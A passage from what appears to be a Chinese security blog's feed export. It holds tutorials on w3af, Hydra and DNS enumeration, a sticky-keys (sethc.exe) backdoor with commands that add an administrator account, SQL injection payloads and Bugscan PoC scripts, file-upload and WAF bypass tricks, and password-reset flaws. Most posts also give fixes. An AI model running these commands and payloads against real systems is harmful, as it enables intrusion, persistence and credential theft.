-l 查看系统信息12345678uname -auname -m 显示机器的处理器架构uname -r 显示正在使用的内核版本cat /proc/cpuinfo 显示CPUinfo的信息cat /proc/meminfo 校验内存使用cat /proc/version 显示内核的版本cat /proc/net/dev 显示网络适配器及统计cat /proc/mounts 显示已加载的文件系统 磁盘管理查看磁盘空间利用大小1df -h 挂载U盘1234fdisk -l 查看U盘路径monut /dev/sdb4 /mnt 挂载U盘cd /mnt 进入U盘umount /mnt 退出U盘 Linux学习网站http://linuxtools-rst.readthedocs.io/zh_CN/latest/http://man.linuxde.net/]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web安全工具——w3af教程]]></title>
    <url>%2F2017%2F11%2F28%2FWeb%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E2%80%94%E2%80%94w3af%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[W3af是一个基于Python的Web应用扫描器,在之前的版本中有windows的版本，但是在最新的版本中windows不再更新，如果想要安装windows版本，下面有链接： windows安装W3af百度云地址如下：链接：https://pan.baidu.com/s/1pKTmllx密码：owf4下载成功后，直接运行exe进行安装即可安装完成后，桌面上多了两个图标w3af Console和w3af GUI打开w3af GUI，会同时打开命令行界面和图形界面 Linux安装W3af这次安装是在ubuntu系统，ubuntu下不建议使用apt-get安装，在安装包的依赖关系上可能会存在一些问题。 确保安装环境安装Git 客户端:1sudo apt-get install git python需要2.7的环境安装pip1sudo apt-get install python-pip 安装步骤下载W3af1git clone https://github.com/andresriancho/w3af.git 进入目录执行w3af_console文件12cd w3af./w3af_console 会提示系统未安装很多依赖环境：需要安装的环境，已经写在了/tmp目录下的w3af_dependency_install.sh文件里面，执行它即会自动下载安装所需的所有文件如果环境安装没有问题的话，这时候就可以运行w3af了，但是偏偏又出错了报错提示我的OpenSSL模块出了问题报错的原因是说module对象的几个属性不存在，于是小编注释掉了SSL.py的4个属性进一步安装了一个库：1pip install crypto 最终成功运行，但是！！！运行控制台的时候，还是需要安装2个依赖包按照提示安装好了后，就可以运行gui了。 W3af的基础教程插件介绍主要插件：1.Crawl（爬取）类职责：通过爬取网站站点来获得新的URL地址。如果用户启用了Crawl类型的多个插件，此时将产生一个循环： A插件在第一次运行时发现了一个新的url，w3af会将其发送到插件B。如果插件B发现一个新的url则会发送到插件A。这个过程持续进行直到所有插件都已运行且无法找到更多的新信息。2.Audit（审计）类该类插件会向Crawl插件爬取出的注入点发送特制的POC数据以确认漏洞是否存在。3.Attack（攻击）类如果Audit插件发现了漏洞，Attack将会进行攻击和利用，通常会在远程服务器上返回一个shell或者比如SQL注入则会获取数据库的数据。其他插件：1.Infrastructure（基础）插件这类插件用来标识有关目标系统的信息，如安装的WAF，操作系统和HTTP守护进程等。2.Grep（检索）插件这类插件会分析其他插件发送的HTTP请求和相应并识别漏洞。3.Output（输出）插件这类插件会将插件的数据保存到文本，xml或者是html文件中。调试的信息也会发送到输出Output插件并可保存和分析。如果启用了text_file和xml_file这两个Output插件，则这两个都会记录有Audit插件发现的任何漏洞。4.Mangle插件允许修改基于正则表达式的请求和响应。5.Broutforce插件在爬去阶段进行暴力登陆。6.Evasion（绕过）插件通过修改由其他插件生成的HTTP请求来绕过简单的入侵检测规则。 运行W3af$ ./w3af_consolew3af&gt;&gt;&gt;通过”help“命令查看帮助信息，“help”命令可以带一个参数，如果参数有效，则会显示该参数命令的详细帮助信息所有的插件配置菜单都提供了以下命令：help：获得每个配置参数的详细帮助view：列出所有可配置参数及其值和说明set：用于更改值back：返回上一个菜单，也可以使用Ctrl+C 插件配置除了攻击插件之外，所有插件都可以使用plugins这个配置菜单进行配置。下面是列出Audit（审计）类型的所有插件假设要启用xss和sqli插件，需要用到以下命令1audit xss,sqli audit可以在audit中看到Status为Enabled如果带上desc命令，还会显示这个插件的详细信息保存配置：配置好了插件和框架配置就可以将配置保存在配置文件中 开始扫描配置插件——常规扫描的话，我们建议使用以下的配置运行w3af：crawl类插件使用web_spider插件audit 类插件设置成Enable allgrep类插件设置成Enable all配置命令如下：输出扫描报告——output不设置默认只会在console上输出扫描信息。一般我们再加上输出csv_file（表格）和html_fiel（网页）两种格式的扫描报告扫描报告默认会保存在/root目录下，你可以使用out config命令去设置。保存配置——profiles设置目标，开始扫描——target，start1234w3af&gt;&gt;&gt; targetw3af/config:target&gt;&gt;&gt; set target http://ip/w3af/config:target&gt;&gt;&gt; backw3af&gt;&gt;&gt; start]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Xhydra使用教程]]></title>
    <url>%2F2017%2F11%2F28%2FXhydra%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[THC-HYDRA是一个支持多种网络服务的非常快速的网络登陆破解工具。这个工具是一个验证性质的工具，它被设计的主要目的是为研究人员和安全从业人员展示远程获取一个系统的认证权限是比较容易的！并且支持多种协议和服务：asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres rdp redis rexec rlogin rsh s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey teamspeak telnet[s] vmauthd vnc xmpp而新的版本中出现了图形化的界面Xydra，下面介绍的就是它的图形化界面的使用 使用说明 小技巧1 当kali-linux 主机被防火墙挡住了，可以考虑断网重新获取IP2 将“ Tunning “ 中的 ” Number of Task “ 的数目设置成小数目，例如2或者33 主界面底栏有具体的命令，当我们设置完具体参数后，底栏将会显示具体的执行命令。这时，在终端中输入 该命令，以命令行的形式执行。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过shift快捷键运行后门]]></title>
    <url>%2F2017%2F10%2F09%2F%E9%80%9A%E8%BF%87shift%E5%BF%AB%E6%8D%B7%E9%94%AE%E8%BF%90%E8%A1%8C%E5%90%8E%E9%97%A8%2F</url>
    <content type="text"><![CDATA[我们都知道，windows系统按5下shift后，windows就执行了system32下的sethc.exe，也就是启用了粘滞键。虽然快捷方便，但却存在安全隐患。 创建shift快捷键后门将我们的cmd.exe或者木马后门名字改成sethc.exe，然后替换C:windows\system32\sethc.exe程序命令：1copy C:\WINDOWS\system32\cmd.exe C:\WINDOWS\system32\sethc.exe /Y 测试是否成功使用远程连接，按5下shift键可以调出cmd命令窗口，还可以添加账户：使用net user可以查看是否添加成功。使用命令添加到管理员组1net localgroup administrators test /add 然后就可以使用创建的用户登录了 远程桌面会话劫持登录主机结合query和tscon命令达到会话劫持目的query user查询所有已登录的用户会话信息tscon 会话ID切换到目标会话状态回车之后可直接切换成目标用户登录系统。 修复方案方案一：删除sethc.exe程序所有用户运行权限接下来就无法使用粘滞键快捷键了，另外提醒一下，直接删除sethc.exe是没用的，系统还会自动找回。方法二：添加一个everyone用户组，然后权限选择拒绝所有方案三：禁用shift快捷键]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>后门</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于报错布尔时间的SQL注入POC编写]]></title>
    <url>%2F2017%2F09%2F16%2F%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E5%B8%83%E5%B0%94%E6%97%B6%E9%97%B4%E7%9A%84SQL%E6%B3%A8%E5%85%A5POC%E7%BC%96%E5%86%99%2F</url>
    <content type="text"><![CDATA[下面的文章写出了SQL注入的报错，布尔，时间注入的POC，通过这三个POC的编写来进入编写POC的入门。 基于报错的 SQL 注入 PoC 编写选择的漏洞为CmsEasy最新版5.5_UTF-8_20140802多处SQL注入 ：http://wooyun.jozxing.cc/static/bugs/wooyun-2014-070827.html 漏洞分析漏洞分析在原文已经说的很详细了，大可以回原文查看。我们在编写 PoC 的时候，如果原文中已经给出了具体的利用办法，我们就无需再关注整个漏洞的成因和原理，我们只用看这个漏洞的复现方式。阅读原文后我们得到了 payload 和 目标 URL1234请求的链接：http://xxx.com/celive/live/header.phpPOST 数据内容：xajax=LiveMessage&amp;xajaxargs[0][name]=1&apos;,(SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(select concat(username,0x23,password) from cmseasy_user where groupid=2 limit 1))a from information_schema.tables group by a)b),&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;1&apos;,&apos;127.0.0.1&apos;,&apos;2&apos;)# 漏洞复现实验所需要 CMS 的下载地址: http://pan.baidu.com/s/1i4lAwBF安装完毕后，我们就可以进行手工复现利用过程了 基于 Bugscan 框架编写POCBugscan 框架要求所有的逻辑代码都必须是基于 Python 2.7 的标准库的，所以像 requests 这种第三方库就不能在这里使用了Bugscan配置环境：http://doc.bugscan.net/chapter1/1-1.html代码编写12345678910111213141516171819202122232425262728#!/usr/bin/env python# -*- coding: utf-8 -*-import urllibdef assign(service, arg): if service == "cmseasy": return True, argdef audit(arg): target = arg + '/celive/live/header.php' post_data = &#123; 'xajax': 'LiveMessage', 'xajaxargs[0][name]': "1',(SELECT 1 FROM (select count(*),concat(" "floor(rand(0)*2),(select md5(233)))a from " "information_schema.tables group by a)b)," "'','','','1','127.0.0.1','2') #" &#125; code, head, body, errcode, redirect_url = curl.curl2( target, post=urllib.urlencode(post_data)) if 'e165421110ba03099a1c0393373c5b43' in body: security_hole(target)if __name__ == '__main__': from dummy import * audit(assign('cmseasy', 'http://localhost/cmseasy/')[1]) 说明整体结构就像上面说的那样，最上面，是引入自己要用到的标准库，assign 就是任务分配函数，是来判断本次扫描任务是否可以调用这个 PoC 的， audit 就是整个验证逻辑的入口了，最下面的 if name == ‘main’: 这段代码是为了让你在本地测试用的。 基于布尔的盲注的 SQL 注入 PoC 编写选择漏洞为Sqli labs Less-5 漏洞分析目标URL http://127.0.0.1/sqli/Less-5/index.php?id=1存在注入的参数是 id，由于sql 语句执行的选择后，选择的数据不能回显到前端页面，所以注入的类型是 Boolean-Based Blind 漏洞复现请求的SQL语句1SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1 构造语句12返回正确的语句 http://127.0.0.1/sqli/Less-5/index.php?id=1&apos; and 4343=4343%23返回不正确的语句 http://127.0.0.1/sqli/Less-5/index.php?id=1&apos; and 4343=4342%23 对比两个 Payload, 发现唯一的差别就是 4343=4343 和 4343=4342 了,当然这里的这个数字嘛，随便写的访问上面两个链接之后发现，第一个请求的响应页面中You are in………..，而第二个请求的响应页面中没有 基于 Bugscan 框架的扫描插件编写1234567891011121314151617181920212223242526272829303132333435363738#!/usr/bin/env python# -*- coding: utf-8 -*-import redef assign(service, arg): if service == fingerprint.sqli: return True, argdef audit(arg): # 开发者可调用自定义函数 verify(arg)def verify(url): payloadtrue = "&#123;target&#125;/index.php?id=1%27%20and%201=1%23".format(target=url) payloadfalse = "&#123;target&#125;/index.php?id=1%27%20and%201=2%23".format(target=url) try: code1, head1, body1, redirect_url1, log1 = hackhttp.http(payloadtrue) if code1 != 200 or not\ re.search('You are in', body1, re.M): return code2, head2, body2, redirect_url2, log2 = hackhttp.http(payloadfalse) if code2 != 200 or\ re.search('You are in', body2, re.M): return security_hole("%s" % (payloadtrue), log=log1) except: passif __name__ == '__main__': from dummy import * audit(assign(fingerprint.sqli, 'http://127.0.0.1/sqli/Less-5')[1]) 基于时间的盲注的 SQL 注入 PoC 编写选择的漏洞为Sqli labs Less-5同一个漏洞有时间我们可以用不同的利用方式 漏洞分析构造语句1234请求链接http://xxx.com/sqli/Less-5/index.php?id=1get数据内容1&apos; and (select if(1=1,sleep(5),1))--+ 核心的 SQL 语句是这样的， select if(1=1,sleep(5),1) 熟悉 MySQL 语法的人应该知道这个意思，第一个参数是表达式，就是说如果表达式为真的话，就执行第二个参数位置的语名，在本例子中是 sleep 5秒，如果为假就执行第三个参数位置的语句，本例子中就是返回一个字符 1 漏洞复现12345请求链接http://127.0.0.1/sqli/Less-5/index.php?id=1get数据内容1&apos; and (select if(1=1,sleep(5),1))--+1&apos; and (select if(1=2,sleep(5),1))--+ 我们打开 Firefox 浏览器，开启 hackbar, 再打开开发者工具，调到网络选项卡，可以看到不同的GET所花费的时间的不同 基于 Bugscan 框架的扫描插件编写123456789101112131415161718192021222324252627282930313233343536373839404142#!/usr/bin/env python# coding:utf-8import urllibimport timedef assign(service, arg): if service == fingerprint.sqli5: return True, argdef audit(arg): target = "%s/celive/live/header.php" % arg get_data1 = "&#123;target&#125;/index.php?id=1%27%20and%20(select%20if(1=1,sleep(5),0))--+".format(target=arg) #print get_data1 get_data2 = "&#123;target&#125;/index.php?id=1%27%20and%20(select%20if(1=2,sleep(5),0))--+".format(target=arg) try: # 记录开始请求的时间 start_time = time.time() # 发送 HTTP 请求 # 这里需要注意的是 hackhttp 返回的第 4 个和第 5 个参数 code1, head1, html1, redirect1, log1 = hackhttp.http(get_data1) # 记录正常请求并收到响应的时间 end_time_1 = time.time() code2, head2, html2, redirect2, log2 = hackhttp.http(get_data2) # 收到响应的时间 end_time_2 = time.time() # 计算时间差 delta1 = end_time_1 - start_time delta2 = end_time_2 - end_time_1 #print delta1 #print delta2 if (delta1 - delta2) &gt; 4: # 注意：warning 和 hole 级别必须传递 log security_hole("%s" % (target), log=log1) except Exception,e: print e passif __name__ == '__main__': from dummy import * audit(assign(fingerprint.sqli5, 'http://127.0.0.1/sqli/Less-5')[1])]]></content>
      <categories>
        <category>安全编程</category>
      </categories>
      <tags>
        <tag>POC</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[POC编写基础知识]]></title>
    <url>%2F2017%2F09%2F16%2FPOC%E7%BC%96%E5%86%99%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[什么是 PoCPoC(全称: Proof of Concept), 中文译作概念验证。在安全界，你可以理解成为漏洞验证程序,和一些应用程序相比，PoC 是一段不完整的程序，仅仅是为了证明提出者的观点的一段代码 什么是 ExpExp(全称: Exploit),中文叫漏洞利用程序。名字上说的已经很清楚了，简单讲，就是一段可以发挥漏洞价值的程序，这话感觉和没说一样。想象一下这样的场景，目标存在一个 SQL 注入漏洞，然后被你知道了，然后你编写了一个程序，通过这个 SQL 注入漏洞，拿到了目标的权限，那么这个程序就是所谓的 Exp 了. POC与EXP的区别 PoC 和 Exp 是两个东西,PoC 就是用来证明漏洞存在的，而 Exp 是用来利用这个漏洞的，在很多情况下，我们知道了漏洞存在，却不知道具体怎么利用，编写一个 PoC 非常简单，而编写一个 Exp 是相当有挑战性的。 PoC 编写流程根据漏洞详情，寻找受影响版本程序如果是一些 CMS, 可以去 对应的官网下载历史版本程序,有些漏洞作者不会提具体版本号，那你就要根据漏洞作者提交的时间来判断了。当然除了官方网站之外，还可以去 github 上寻找源码，这些个官网都喜欢把历史版本的程序删除掉，善用 github 上的 tag, branch, release 功能，上面有你要的所有版本 搭建对应漏洞靶场这里其实没什么好说的，下载了人家的源码之后，在你的虚拟机里面配置好环境就行了，还能顺便学一下运维的一些皮毛知识。 手动复现漏洞根据漏洞详情，手动将整个流程走一遍，熟悉下复现条件，比如使用 GET 还是 POST 请求，需不需要登陆，返回的页面会是什么样子的，我提交不同的参数，会不会出现其它结果，如果漏洞不存在的话，会出现什么样的结果 写代码手动复现了一次漏洞之后，分析漏洞证明步骤，根据自己的实际测试情况一步一步写代码，用我的话来说，写代码，其实就是用程序模拟人工操作的每一个步骤，如果你上一步认真做了，这一步只是经验问题编写POC，首推语言当然是Python了，原因很简单——好用，Python提供的强大类库可以让我们将主要精力都放在具体漏洞研究上，而不用去纠结诸如如何去实现HTML解析、HTTP发送等辅助功能。常用到的Python库如下：urllib2: 发送HTTP/HTTPS请求requests:更“高级”的urllib2库re：正则表达式random：生成随机数base64：base64编码hashlib:常用来计算md5值time：用来统计访问时间延迟……当然语言只是工具载体，并不局限于Python。原则上你想用什么语言都可以，建议首选那种外部条件依赖少、简单好用而且自己也比较熟悉的语言 测试 PoC其它测试和编码基本都是在同时进行的，为什么要单独提出来讲呢，我们在写 PoC 的时候，除了在存在漏洞的靶机上测试我们的代码，还要在不存在漏洞的站点测试，一般为说，一个优秀的 PoC 在后期测试的时候要求对 10000 个目标测试，误报不能超过 10 个 国内 PoC 框架简介POC框架可以对大量POC进行管理与调度，提供了统一的编程规范与接口，是编写POC很好的帮手。我们只需要按照框架自定义的格式写好POC，然后放在框架中运行即可。目前国内有很多非常优秀框架，这里就介绍其中的几款1.PocsuitePocsuite框架现为知道创宇Seebug平台通用的漏洞验证框架，使用Python编写POC。可以提交POC换kb，kb可以用来兑换现金，挣点零花钱还是相当不错的。老司机们可能听过Sebug，那是Seebug的前身，2016年Sebug收购了另一个优秀框架Beebeeto后，更名为Seebuggithub地址：https://github.com/knownsec/Pocsuite2.BugscanBugscan是四叶草的官方框架，使用Python编写POC。提交POC插件获取rank 奖励，可兑换实物奖励，奖品还是蛮丰富的BugScan SDK：http://doc.bugscan.net/TangscanTangscan（唐朝扫描器）是wooyun社区的官方框架，使用Python编写POC。可以提交POC换汤圆，参与现金分红。Tangscan社区已经关闭，不知道还会不会开，里面的汤圆还没取出来呢。github地址：https://github.com/WooYun/TangScan]]></content>
      <categories>
        <category>安全编程</category>
      </categories>
      <tags>
        <tag>POC</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传漏洞解析及绕过姿势]]></title>
    <url>%2F2017%2F09%2F16%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%8F%8A%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%2F</url>
    <content type="text"><![CDATA[文件上传漏洞在渗透测试中是一个非常重要的漏洞，因为这个漏洞可以很快的拿到服务器的权限，下面介绍一下文件上传漏洞的效验方法，绕过方式，和一些修复建议。 文件上传校验姿势 客户端javascript校验（一般只校验后缀名） 服务端校验 文件头content-type字段校验（image/gif） 文件内容头校验（GIF89a） 后缀名黑名单校验 后缀名白名单校验 自定义正则校验 WAF设备校验（根据不同的WAF产品而定）客户端JS验证验证代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?php//文件上传漏洞演示脚本之js验证$uploaddir = 'uploads/';if (isset($_POST['submit'])) &#123; if (file_exists($uploaddir)) &#123; if (move_uploaded_file($_FILES['upfile']['tmp_name'], $uploaddir . '/' . $_FILES['upfile']['name'])) &#123; echo '文件上传成功，保存于：' . $uploaddir . $_FILES['upfile']['name'] . "\n"; &#125; &#125; else &#123; exit($uploaddir . '文件夹不存在,请手工创建！'); &#125; //print_r($_FILES);&#125;?&gt;&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt; &lt;meta http-equiv="Content-Type" content="text/html;charset=gbk"/&gt; &lt;meta http-equiv="content-language" content="zh-CN"/&gt; &lt;title&gt;文件上传漏洞演示脚本--JS验证实例&lt;/title&gt; &lt;script type="text/javascript"&gt; function checkFile() &#123; var file = document.getElementsByName('upfile')[0].value; if (file == null || file == "") &#123; alert("你还没有选择任何文件，不能上传!"); return false; &#125; //定义允许上传的文件类型 var allow_ext = ".jpg|.jpeg|.png|.gif|.bmp|"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(".")); //alert(ext_name); //alert(ext_name + "|"); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + "|") == -1) &#123; var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name; alert(errMsg); return false; &#125; &#125; &lt;/script&gt;&lt;body&gt;&lt;h3&gt;文件上传漏洞演示脚本--JS验证实例&lt;/h3&gt;&lt;form action="" method="post" enctype="multipart/form-data" name="upload" onsubmit="return checkFile()"&gt; &lt;input type="hidden" name="MAX_FILE_SIZE" value="204800"/&gt; 请选择要上传的文件：&lt;input type="file" name="upfile"/&gt; &lt;input type="submit" name="submit" value="上传"/&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 客户端JS验证通常做法是验证上传文件的扩展名是否符合验证条件 绕过姿势1.通过firefox的F12修改js代码绕过验证2.使用burp抓包直接提交，绕过js验证 文件头content-type字段校验（image/gif）验证测试代码12345678910&lt;?phpif($_FILE['userfile']['type'] != "image/gif")&#123; //检测content-type echo "sorry,we only allow uploading GIF images"; exit;&#125;else&#123; echo "Upload success!";&#125;?&gt; 以上是一个简单的服务器上传验证代码，只要content-type符合image/gif就允许上传 绕过方式使用Burp截取上传数据包，修改Content-Type的值，改为image/gif即可成功绕过上传webshell 服务端文件扩展名检测测试代码1234567891011&lt;?php$type = array("php","php3");//判断上传文件类型$fileext = fileext($_FILE['file']['name']);if(!in_array($fileext,$type))&#123; echo "upload success!";&#125;else&#123; echo "sorry";&#125;?&gt; 默认上传后的文件保存的名字是以获取到名字 绕过技巧 使用大小写绕过（针对对大小写不敏感的系统如windows），如：PhP 使用黑名单外的脚本类型，如：php5,asa 和 cer等能被解析的文件扩展名列表：jsp jspx jspfasp asa cer aspx 配合文件包含漏洞前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；（2）然后再上传一个.php的文件，内容为此时，这个php文件就会去引用txt文件的内容，从而绕过校验 配合服务器解析漏洞如：test.jpg.xxx(apache解析漏洞) 配合操作系统文件命令规则（1）上传不符合windows文件命名规则的文件名 test.asp. test.asp(空格) test.php:1.jpg test.php:: $DATA会被windows系统自动去掉不符合规则符号后面的内容。（2）linux下后缀名大小写在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。 双扩展名之间使用00截断，绕过验证上传恶意代码0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候 test.php(0x00).jpg test.php%00.jpg 路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg 借助.htaccess文件上传恶意代码并解析。如：上传一个.htaccess文件，内容为AddTypeapplication/x-httpd-php .jpg，上传的jpg文件就可以当作php来解析 超长文件名截断上传(windows 258byte | linux 4096byte) CMS、编辑器漏洞（1）CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。（2）编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过服务端检测文件头文件头简介不同的图片文件都有不同文件头，如：PNG： 文件头标识 (8 bytes) 89 50 4E 47 0D 0A 1A 0AJPEG： 文件头标识 (2 bytes): 0xff, 0xd8 (SOI) (JPEG 文件标识)GIF： 文件头标识 (6 bytes) 47 49 46 38 39(37) 61绕过方式绕过这个检测只需要在恶意脚本前加上允许上传文件的头标识就可以了在木马内容基础上再加了一些文件信息，有点像下面的结构GIF89a服务器段安装WAF服务器段安装安全狗等安全防御软件绕过方法 垃圾数据有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验； filename针对早期版本安全狗，可以多加一个filename POST/GET有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。此种情况可以上传一个POST型的数据包，抓包将POST改为GET安全建议 使用白名单限制可以上传的文件扩展 验证文件内容，使用正则匹配恶意代码限制上传 对上传后的文件统一随机命名，不允许用户控制扩展名 修复服务器可能存在的解析漏洞 严格限制可以修改服务器配置的文件上传如：.htaccess 隐藏上传文件路径。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>文件上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[逻辑漏洞之密码重置]]></title>
    <url>%2F2017%2F09%2F16%2F%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[逻辑错误漏洞是指由于程序逻辑不严或逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误，一般出现在任意密码修改（没有旧密码验证）、越权访问、密码找回、交易支付金额。下面介绍一下密码重置漏洞。 密码找回验证条件可社工1 只验证帐号是否存在即可修改密码2 只验证帐号与邮箱地址是否匹配即可修改密码3 只验证帐号与手机号是否匹配即可修改密码 密码修改页面可预测案例：http://wooyun.jozxing.cc/static/bugs/wooyun-2012-04190.html 验证码可爆破案例：http://wooyun.jozxing.cc/static/bugs/wooyun-2012-07386.html 修改密码未校验用户案例：http://wooyun.jozxing.cc/static/bugs/wooyun-2012-07888.html 密码重置验证码接收帐号由客户端决定案例：http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0153395.html 修改返回包绕过验证码找回密码案例：http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0128703.html 重置密码新密码出现在返回的数据包中案例：http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0131428.html 密码重置验证码出现在返回数据包中案例：http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0133855.html 密码重置验证码多人公用案例：http://wooyun.jozxing.cc/static/bugs/wooyun-2015-091414.html 修复方案1 减少验证码有效时间2 使用后即销毁3 增加验证码复杂程序，整个md5 不困难吧，4 限制该功能单个ip提交频率5 对重要参数加入验证码同步信息或时间戳；6 重置密码后，新密码不应返回在数据包中。7 接收验证码的帐号由服务端提供，不能信任客户端提交的数据]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>逻辑漏洞</tag>
        <tag>密码重置</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS信息查询]]></title>
    <url>%2F2017%2F09%2F14%2FDNS%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2%2F</url>
    <content type="text"><![CDATA[DNS查询在渗透或者运维工作经常遇到，尤其是内部有DNS服务器的公司，需要定时监测DNS解析的是否正常，有无被DNS劫持的情况。下面介绍几个常见的DNS查询工具。 nslookupnslookup可以指定查询的类型，可以查到DNS记录的生存时间还可以指定使用哪个DNS服务器进行解释 用法非交互式查询y-hkl.top域名对应的ip，这里指定了前往114.114.114.114－dns服务器进行查询。123456root@HKL:~# nslookup y-hkl.top 114.114.114.114Server: 114.114.114.114Address: 114.114.114.114#53Non-authoritative answer:Name: y-hkl.topAddress: 查询y-hkl.top域名DNS服务商1234567root@HKL:~# nslookup -type=ns y-hkl.topServer: 114.114.114.114Address: 114.114.114.114#53Non-authoritative answer:y-hkl.top nameserver = y-hkl.top nameserver = Authoritative answers can be found from: 查询y-hkl.top的邮件服务器1234567root@HKL:~# nslookup -type=mx y-hkl.topServer: 114.114.114.114Address: 114.114.114.114#53Non-authoritative answer:y-hkl.top mail exchanger = y-hkl.top mail exchanger = Authoritative answers can be found from: 交互式1234567nslookup&gt;set type=a #设置更改要查询的dns解析类型&gt;y-hkl.top #输入要查询的域名&gt;set type=mx #设置更改要查询的dns解析类型&gt;y-hkl.top&gt;server 114.114.114.114 #设置更改要查询的dns服务器地址&gt;ls y-hkl.top #ls命令列出某个域中的所有域名 常见DNS记录类型1234567A IP地址记录,记录一个域名对应的IP地址AAAA IPv6 地址记录，记录一个域名对应的IPv6地址CNAME 别名记录，记录一个主机的别名 MX 电子邮件交换记录，记录一个邮件域名对应的IP地址，如root@xxxx.comNS 域名服务器记录 ,记录该域名由哪台域名服务器解析PTR 反向记录，也即从IP地址到域名的一条记录TXT 记录域名的相关文本信息 host用法1host -t A thief.one 参数12345678910-a：显示详细的DNS信息；-c&lt;类型&gt;：指定查询类型，默认值为“IN“；-C：查询指定主机的完整的SOA记录；-r：在查询域名时，不使用递归的查询方式；-t&lt;类型&gt;：指定查询的域名信息类型；-v：显示指令执行的详细信息；-w：如果域名服务器没有给出应答信息，则总是等待，直到域名服务器给出应答；-W&lt;时间&gt;：指定域名查询的最长时间，如果在指定时间内域名服务器没有给出应答信息，则退出指令；-4：使用IPv4； host-6：使用IPv6. dig用法12345dig thief.one mxdig thief.one nsdig @202.106.0.20 thief.one a 指定dns服务器dig thief.one a +tcp 设置为tcp协议，默认为udpdig thief.one a +trace 这个参数之后将显示从根域逐级查询的过程 若http://y-hkl.top 的DNS服务器为10.0.0.1，且存在域传送漏洞，则使用dig @10.0.0.1 http://y-hkl axfr即可查看所有域名了。 参数123456789@&lt;服务器地址&gt;：指定进行域名解析的域名服务器；-b：当主机具有多个IP地址，指定使用本机的哪个IP地址向域名服务器发送域名查询请求；-f&lt;文件名称&gt;：指定dig以批处理的方式运行，指定的文件中保存着需要批处理查询的DNS任务信息；-P：指定域名服务器所使用端口号；-t&lt;类型&gt;：指定要查询的DNS数据类型；-x：执行逆向域名查询；-4：使用IPv4；-6：使用IPv6；-h：显示指令帮助信息。 whois1whois thief.one]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[s2-053漏洞复现]]></title>
    <url>%2F2017%2F09%2F13%2Fs2-053%E5%A4%8D%E7%8E%B0%2F</url>
